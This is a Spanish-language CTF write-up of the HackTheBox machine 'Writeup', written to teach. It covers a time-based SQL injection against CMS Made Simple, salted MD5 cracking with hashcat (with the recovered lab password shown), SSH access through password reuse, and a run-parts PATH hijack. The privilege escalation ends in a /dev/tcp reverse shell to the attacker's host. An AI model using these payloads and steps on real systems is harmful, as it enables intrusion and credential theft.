---
layout      : post
title       : "HackTheBox - Writeup"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png
category    : [ htb ]
tags        : [ CMS, SQLi, path-hijacking, cracking ]
---
Máquina **Linux** nivel fácil, nos miraremos a los ojos con un **CMS** vulnerable a **SQLi time-based**. Haremos reutilización de credenciales y encontraremos un **PATH Hijacking** guapetón.

![192writeupHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192writeupHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [jkr](https://www.hackthebox.eu/profile/77141).

Bueno vueno weno, vamos inicialmente a encontrarnos con el gestor de contenido (CMS) **Made-Simple**, relacionaremos una explotación **SQL** basada en tiempo con el gestor, jugaremos y lograremos dumpear unas credenciales del usuario **jkr**. 

Tendremos en mente que las credenciales obtenidas solo son válidas contra el *CMS*, pero haciendo reutilización de contraseñas conseguimos una sesión en la máquina mediante **SSH** como el usuario **jkr**.

Enumerando si existen tareas programadas, veremos que cuando un usuario ingresa por **SSH** se hace el llamado al programa ***run-parts***, peeeeeeero es llamado como tal, sin ruta absoluta. Esto nos dará el impulso para pensar en un ataque tipo **PATH Hijacking**, teniendo esto en cuenta y que el usuario ***jkr*** está en el grupo **staff** lograremos obtener una reverse Shell como el usuario **root**.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Vulnerabilidades conocidas (probablemente por eso el nombre de la máquina) y va 🧗 ante el realismo.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

a e i o uuuuuuuuuuuuuuuuuuuuuuuuuu.

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Vamos a empezar escaneando los puertos con **nmap**, así podemos ir encontrando alguna ruta de explotación/exploración ante la máquina:

```bash
❱ nmap -p- --open -v 10.10.10.138 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Como resultado obtenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Fri Jun  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.138
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.138 () Status: Up
Host: 10.10.10.138 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///  Ignored State: filtered (65533)
# Nmap done at Fri Jun  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 276.14 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)** |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)** |

**~(Para copiar los puertos directamente en la clipboard (aunque sean 2), hacemos uso de la función referenciada antes**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.138
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

Ahora hacemos un escaneo de scripts y versiones de cada puerto encontrado, así hacemos más directa nuestra investigación:

```bash
❱ nmap -p 22,80 -sC -sV 10.10.10.138 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Validamos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Fri Jun  4 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10.67 seconds
```

Cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.4p1 Debian 10+deb9u6 |
| 80     | HTTP     | Apache httpd 2.4.25 ((Debian)) |

* El puerto **80** tiene una entrada "escondida" llamada `/writeup/`.

Empecemos a explorar a ver que encontramos...

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![192page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80.png)

Podemos destacar varias cositas:

* **Donkey DoS**.
* **jkr**: Probable usuario de "algo".
* **writeup.htb**: Dominio a tener en cuenta.

Veamos el recurso `/writeup/`:

![192page80_robotsTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_robotsTXT.png)

![192page80_writeup](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_writeup.png)

Bien, simplemente tiene algunos "writeups" (fragmentos) de otras máquinas de la plataforma, pero nada relevante...

Jugando con [Wappalyzer](https://www.google.com/search?client=firefox-b-d&q=wappalyzer) y [whatweb](http://todolinux.cl/wordpress/2015/12/19/whatweb-el-primer-reconocimiento-web/) vemos algo interesante:

```bash
❱ whatweb http://10.10.10.138/writeup
```

Nos responde con 2 peticiones, una hacia `/writeup` y otra hacia `/writeup/`:

```bash
http://10.10.10.138/writeup [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], RedirectLocation[http://10.10.10.138/writeup/], Title[301 Moved Permanently]
```

Hacia `/writeup/` está lo llamativo:

```bash
http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]
```

Un gestor de contenido llamado [CMS-Made-Simple](https://en.wikipedia.org/wiki/CMS_Made_Simple), no tenemos nada más, pero al menos sabemos el software que esta detrás de la web (: Ahora podemos (como prueba de siempre) buscar algunos exploits relacionados con él y ver si nuestra web es vulnerable a ellos 🕴️

...

## Explotación [#](#explotacion) {#explotacion}

Haciendo una búsqueda rápida como: `cms made simple exploit`, nos encontramos uno llamativo:

* [CMS Made Simple \< 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635).
  * [CMS Made Simple up to 2.2.8 **m1_idlist** Time-Based SQLi](https://vuldb.com/?id.132463).

Se trata de una [inyección **SQL** basada en tiempo](https://www.sqlinjection.net/time-based/), no se necesita autenticación ni cosas extra. Las peticiones que hace, giran en torno a una en específico, si esa no nos diera respuesta, este exploit no nos funcionaría:

```py
...
url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
...
```

Donde `options.url` sería la URL que le pasemos, en nuestro caso: `http://10.10.10.138/writeup`.

Si validamos esa petición en la web, obtenemos:

![192page80_moduleinterfacePHP_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192page80_moduleinterfacePHP_done.png)

Bien, nos responde, no hay nada interesante en el texto, peeeeeeeeeero hemos confirmado que existe esa URL, por lo tanto podemos probar ahora si el exploit funciona. Lo descargamos y ejecutamos:

**(Originalmente el exploit está hecho en **Python 2.x**, pero tengo un problema con la librería `requests` en esa versión de **Py**, *por suerte* cambiando los `print ..` por `print(..)` nos permite ejecutar el programa con **Python 3** sin problemas)**

```bash
❱ python3 cms_made_simple_SQLi.py 
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

```bash
❱ python3 cms_made_simple_SQLi.py -u http://10.10.10.138/writeup
```

Y despues de un rato (al ser **time-based**, claramente es "demorado") obtenemos esto con base en la información de la base de datos del **CMS**:

![192bash_cmsmadesimpleSQLi_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_cmsmadesimpleSQLi_done.png)

Bien, nos extrae en concreto la data de un usuario llamado **jkr** en la base de datos usada por el **CMS**, ¿pero como pasa esto?, bueno, enfoquémonos en como obtiene por ejemplo el valor ***salt*** de la ***password***.

#### 🧿 Entendemos la inyección SQL basada en tiempo

En el script usa esta sentencia:

```py
...
payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"   
...
```

Y así viaja la petición:

```py
...
url = url_vuln + "&m1_idlist=" + payload
...
```

Si nos fijamos en el **payload** vemos varias cosillas:

<span style="color: red;">1. </span>`a,b,1,5))`:

Es cuestión de jugar, entiendo que el que encontró la vulnerabilidad hizo eso, probar vaaaarias letras y números y concatenarlo con alguna inyección básica y ver cuál le daba resultado, por ejemplo `c,a,1))...` también funciona como **payload**. Siempre es cuestión de jugar y probar cosas...

<span style="color: red;">2. </span>`+`: 

Los usa como "encoders" de los espacios, ya que si ejecutamos la sentencia (**en la web**) sin esos "+", no se ejecuta la explotación.

<span style="color: red;">3. </span>La parte interesante:

...

Si quisiéramos validar algún **SQL blind** time-based en este caso, ejecutando algo tan sencillo como:

```bash
# Respuesta inmediata
❱ time curl "http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5"
real    0m0,253s
user    0m0,009s
sys     0m0,003s
...
# 3 segundos de delay si hay ejecucion exitosa :)
❱ time curl "http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+sleep(3)+--+"   
...
real    0m3,474s
user    0m0,009s
sys     0m0,008s
```

Y vemos los 3 segundos... Ya con lo que juguemos despues del **and** es inyección **SQL** (:

...

Ahora si e.e

```sql
+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+
```

Donde le indica que seleccione ([SELECT](http://sql.11sql.com/sql-select.htm)) algo, (si lo encuentra ejecuta `sleep(1)` (en el script **TIME** vale `1`), o sea, **hace un delay en la respuesta de un segundo (1)**) de ([FROM](https://www.w3schools.com/sql/sql_ref_from.asp)) la tabla `cms_siteprefs` donde ([WHERE](https://estradawebgroup.com/Post/Aprende-a-utilizar-las-condiciones-con-la-clausula-WHERE-de-SQL-/4297)) el valor de la columna `sitepref_value` **en este caso** empiece con (leyendo sobre **LIKE** se entenderá el porqué, igual abajo lo digo) ([LIKE](https://www.w3schools.com/sql/sql_like.asp) `...%`) el valor de la variable `ord_salt_temp`:

> Que toma el valor de cada letra con la que va iterando, ejemplo, prueba la `a` (¿empieza por con `a`?), la `b` (¿empieza con `b`?) y asi, eso va conformando ese valor, peeeeero no literalmente, lo pasa primero a decimal (valor ASCII del caracter) y despues a hexadecimal, ese si seria el resultado de la variable `ord_salt_temp`. Si algun caracter ejecuta el **sleep**, toma ese char y lo guarda para al final conformar (en este caso) el **salt** completo (:
>> ¿empieza con `a`? si, guarda la `a` y ahora haría: ¿empieza con `ab`? si, y etc e.e

El valor del **LIKE** por ejemplo con la letra `a` quedaría así: 

```sql
... like 0x6125+and...`
```

El **25** de **hex** a **Ascii** significa `%` (esto es sintaxis del propio [LIKE](https://www.w3schools.com/sql/sql_like.asp)).

**(Quizás me explique fatal, pero es sencillo de entender una vez miras el script)**

Y finalmente le añade a la búsqueda que el valor de la columna `sitepref_name` se parezca al valor hexadecimal `0x736974656d61736b` (que significa `sitemask` en **Ascii**)...

Con esto es que se consigue la explotación (: Ya va variando según lo que se quiera conseguir :)

...

Validando en internet que tipo de hash es, corroboramos que es tipo [MD5](https://www.nerion.es/blog/cifrado-md5/):

![192google_hashid_jkr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_hashid_jkr.png)

Podemos agregarle el valor [salt](https://es.quora.com/Qu%C3%A9-significa-agregar-un-salt-a-una-contrase%C3%B1a-hash) para terminar de confirmar que el formato del hash está bien:

![192google_hashidwithsalt_jkr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_hashidwithsalt_jkr.png)

Listones, todo perfeeeeeeecto.

Usando [esta guía](https://attackdefense.com/challengedetailsnoauth?cid=52) sobre "*Cracking Salted MD5 Hashes*", podemos empezar a jugar:

Generamos un archivo que contenga el **hash** y la **salt**:

```bash
❱ cat madeSimple_jkr.hash 
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
```

Y ahora con **hashcat** pasamos data en algunos parámetros:

| Parámetro | Descripción |
| --------- | :---------- |
| -m         | Toma el tipo de hash con el que estamos tratando.   |
| -a         | Le indicamos el tipo de ataque que haremos, usaremos `0`, así entenderá que es un `dictionary-attack` (para poder hacer uso de **wordlists**). |
| \<hashfile\> | Pos eso :P El archivo donde esta nuestro hash       |
| \<wordlist\> | Y el archivo que usaremos como lista de palabras :) |
| -o         | Para que nos guarde el resultado en el archivo que indiquemos. |

Apoyándonos en [los ejemplos de hashes de **hashcat**](https://hashcat.net/wiki/doku.php?id=example_hashes) logramos obtener el valor de `-m`:

![192google_wikiexample_md5salts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192google_wikiexample_md5salts.png)

Dos opciones, probamos con las dos por si algo :P

```bash
❱ hashcat -m 10 -a 0 madeSimple_jkr.hash /usr/share/wordlists/rockyou.txt -o cracked_plain.txt
...
Status...........: Exhausted
Hash.Name........: md5($pass.$salt)
...
```

Con el tipo de hash `10` no obtenemos respuesta, probando con el `20`:

```bash
❱ hashcat -m 20 -a 0 madeSimple_jkr.hash /usr/share/wordlists/rockyou.txt -o cracked_plain.txt
...
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
...
```

Opa, nos indica que fue crackeado, si validamos nuestro archivo `cracked_plain.txt` tenemos:

```bash
❱ cat cracked_plain.txt 
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

En valor en texto plano de ese hash y el salt es: `raykayjay9` 😵 Por lo tanto esa sería la contraseña del usuario `jkr` guardaba en la base de datos del **CMS**... 

Pero ¿Y si validamos si existe alguna reutilización de contraseñas por parte de **jkr**? Juguemos con el servicio **SSH** a ver si son válidas:

```bash
❱ ssh jkr@10.10.10.138
jkr@10.10.10.138's password:   
```

Yyyyyyyyyyyyyyyyyyyyyyyy:

![192bash_ssh_jkr_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_ssh_jkr_done.png)

Perfessssto, tamos dentroooooooooooooooooooooooooo!

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Viendo los grupos en los que está el usuario **jkr**, vemos uno distinto a los usuales:

```bash
jkr@writeup:/$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)   
```

El grupo **staff**...

Buscando vemos que le permite a los usuarios que lo poseen **añadir** (o modificar) información en las rutas `/usr/local` y `/home` sin necesidad de privilegios, además:

> La "habilidad" de modificar `/usr/local` es equivalente a tener acceso como root, ya que `/usr/local` esta intencionalmente en cuanto a las *rutas de busqueda* antes de `/usr`. [Users and groups - Debian](https://www.chiark.greenend.org.uk/doc/base-passwd/users-and-groups.html).

La cita hace referencia a la variable `$PATH` del sistema, algunos procesos usan esa variable para buscar fuentes o binarios. Ahorita hablaremos de esto.

Estuve un tiempo jugando con ese grupo y un [exploit que lo relacionaba](https://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/), pero no logre nada de ahí.

Está claro que para poder hacer algo con ese grupo y la ruta `/usr/local` necesitamos algún indicio de alguna tarea o ejecución por parte del sistema y no por parte de **jkr**, ya que podemos escribir en la ruta `/usr/local/bin`, pero si lo ejecutamos, será ejecutado como **jkr** :(

Enumerando los procesos internos (con base en lo dicho anteriormente), buscando alguna tarea cron o ejecución de la cual nos podamos aprovechar encontramos esto:

> Usaremos [pspy](https://github.com/DominicBreuker/pspy), que según su propia descripcion nos pemite ver comandos ejecutados por otros usuarios, tareas programadas, etc.

Lo bajamos a nuestra máquina (en nuestro caso comprobamos la arquitectura con el comando `lscpu` y vemos que estamos en una de **64 bits**, así que descargamos ese tipo de binario).

Despues lo pasamos a la máquina y ejecutamos:

```bash
jkr@writeup:/tmp$ ./pspy64
```

![192bash_pspy_plScript](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_pspy_plScript.png)

Vemos una tarea programada, se ve que se ejecuta cada minuto y (según las pruebas que hice con el rabbit hole anterior) borra el contenido de la ruta `/usr/local/bin` (puede que haga otras cosas :P). Pero no nos podemos aprovechar de ella, ya que no tenemos acceso a el script y tampoco podemos pensar en algún **Path Hijacking, ya que los comandos están siendo llamados con su ruta absoluta :(

Usando otra terminal estaba ejecutando procesos (ps, netstat, etc) para con ayuda de **pspy** ver si aparecia algo extraño, pasa que estaba ciego y no me habia fijado en ese "algo" :P 

Cuando se establece una sesión por medio del servicio **SSH** vemos (bueno, estaba ciego y no lo habia visto) algo interesante:

![192bash_pspy_sshTask](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_pspy_sshTask.png)

Vemos que al iniciar una sesión algún usuario por medio de **SSH** se le asigna la variable **$PATH** con varias rutas (ya miraremos esto), peeeeeeeeeero, tambien vemos la ejecución de **dos comandos** sin su ruta absoluta :o Acá ya podemos pensar en algo relacionado o parecido al **PATH Hijacking**:

Validando en que ruta esta el binario `sh` tenemos:

```bash
jkr@writeup:/tmp$ which sh
/bin/sh
```

Bien, y ahora validando la variable `$PATH`:

```bash
jkr@writeup:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

¿Como se relacionan esas dos instrucciones? Muy sencillo:

Al ejecutar `sh` (sin ruta absoluta (ejecutando con ruta absoluta seria `/bin/sh`)), el sistema necesita saber en donde esta el binario relacionado a esa cadena `"sh"`, entonces va a la variable `$PATH` y empieza a recorrer cada uno del los directorios que se encuentran en ella, entonces:

```bash
# Ejecutamos *whoami*
jkr@writeup:/tmp$ sh -c whoami
...
# Busca el binario "sh" en las rutas:
/usr/local/bin 
/usr/bin
/bin
...
```

Si lo encuentra en alguna, por ejemplo: /usr/local/bin/sh, lo ejecuta y termina de buscar, si no, sigue con la siguiente ruta hasta encontrarlo :P, asi de sencillo.

Teniendo esto en mente, podemos empezar a jugar...

Sabemos que el sistema ejecuta `sh` al iniciar sesion con **SSH**, pues empezara a buscar en las rutas del `$PATH` y lo encontraria en `/bin`, peeeero, podemos simplemente crear un archivo que se llame `sh` y moverlo a la ruta `/usr/local/bin`, al iniciar sesion con **SSH** el sistema buscara de nuevo pero ahora lo encontrara primero en esa ruta, por lo tanto será ejecutado :)

Acá no tenemos que preocuparnos en cambiar el valor de la varibale `$PATH` (que por lo general debemos hacer lo en un **PATH Hijacking**), entonces nnos quitamos un paso, demosle:

Como prueba, hagamos que el archivo nos cree otro archivo (e.e) al ser ejecutado, asi validamos que tamos haciendo las cosas bien:

```bash
jkr@writeup:/tmp$ echo "echo 'hola, escrito reemplazando el binario sh' > /tmp/sh_patHijack.txt" > sh
jkr@writeup:/tmp$ cat sh 
echo 'hola, escrito reemplazando el binario sh' > /tmp/sh_patHijack.txt
```

Si se ejecuta, tendremos el archivo `sh_patHijack.txt` en la ruta `/tmp`. Le damos permisos de ejecución y lo movemos a la ruta `/usr/local/bin`:

```bash
jkr@writeup:/tmp$ chmod +x sh 
jkr@writeup:/tmp$ cp sh /usr/local/bin/
jkr@writeup:/tmp$ ls -la /usr/local/bin/sh
-rwxr-xr-x 1 jkr staff 72 Jun  6 20:18 /usr/local/bin/sh   
```

Usamos la otra terminal e iniciamos sesión, validamos si se genero el archivo:

```bash
jkr@writeup:~$ ls -la /tmp/ | grep sh
-rwxr-xr-x  1 jkr  jkr       72 Jun  6 20:16 sh
```

Pero no, no pasa nada...

Si recordamos, hay otro comando que se esta ejecutando llamado `run-parts`:

> run-parts - Ejecuta scripts o programas en un directorio.

Pues podemos hacer exactamente el mismo procedimiento, validamos que ruta tiene el binario por default, vemos si es necesario modificar la variable `$PATH` (no es necesario), generamos un archivo que se llame igual al original, damos permisos, movemos a la ruta `/usr/local/bin` y entramos con **SSH**. Veamos entonces:

```bash
jkr@writeup:/tmp$ echo "echo 'hola, escrito reemplazando el binario run-parts' > /tmp/run_patHijack.txt" > run-parts   
jkr@writeup:/tmp$ chmod +x run-parts
jkr@writeup:/tmp$ cp run-parts /usr/local/bin/
jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts
-rwxr-xr-x 1 jkr staff 80 Jun  6 20:25 /usr/local/bin/run-parts
...
❱ ssh jkr@10.10.10.138
...
jkr@writeup:~$ ls -la /tmp | grep run
-rwxr-xr-x  1 jkr  jkr       80 Jun  6 20:24 run-parts
-rw-r--r--  1 root root      48 Jun  6 20:26 run_patHijack.txt
jkr@writeup:~$ cat /tmp/run_patHijack.txt 
hola, escrito reemplazando el binario run-parts
```

Opa 🤸‍♀️ Pues ha funcionaaaao (:

Ahora podemos usar el **PATH Hijacking** para ejecutar cualquier comando como el usuario **root**, pues entablemonos una reverse shell ahí de rapidez:

```bash
jkr@writeup:/tmp$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.16/4433 0>&1'" > run-parts   
jkr@writeup:/tmp$ cat run-parts 
bash -c 'bash -i >& /dev/tcp/10.10.14.16/4433 0>&1'
jkr@writeup:/tmp$ cp run-parts /usr/local/bin/
jkr@writeup:/tmp$ ls -la /usr/local/bin/run-parts
-rwxr-xr-x 1 jkr staff 52 Jun  6 21:31 /usr/local/bin/run-parts
```

![192bash_rootSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192bash_rootSH.png)

LISTONEEEEEEEEEEEEEEEEEEEEEEEEEEEEEES!! Tamos dentro como el usuario **root**, echemosle un ojo a las flags:

![192flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192flags.png)

Emho akabhao'

...

Linda experiencia. El **PATH Hijacking** estuvo lindo, pero me gusto más el como lo encontramos...

Listoooooooones... Vamos caminando por un desierto (e.e), miramos el techo (u.u) y nos encontramos una nota en el suelo (o.o) y dice: "A seguir rompiendo TODO!!" ❤️